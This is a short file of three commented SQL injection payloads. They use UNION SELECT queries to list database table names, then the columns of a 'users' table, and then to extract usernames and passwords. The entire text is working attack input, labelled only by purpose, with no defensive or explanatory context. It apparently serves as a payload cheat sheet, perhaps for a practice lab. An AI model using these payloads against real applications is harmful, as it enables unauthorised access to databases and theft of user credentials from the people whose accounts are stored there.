/* SQL payload for revealing database table names */
' UNION SELECT table_name, NULL  FROM information_schema.tables  WHERE table_schema = database()#

/* SQL payload for revealing column names in the user table */
' UNION SELECT column_name, NULL  FROM information_schema.columns  WHERE table_name = 'users'#

/* SQL payload for extracting user login credentials */
' UNION SELECT user, password FROM users#
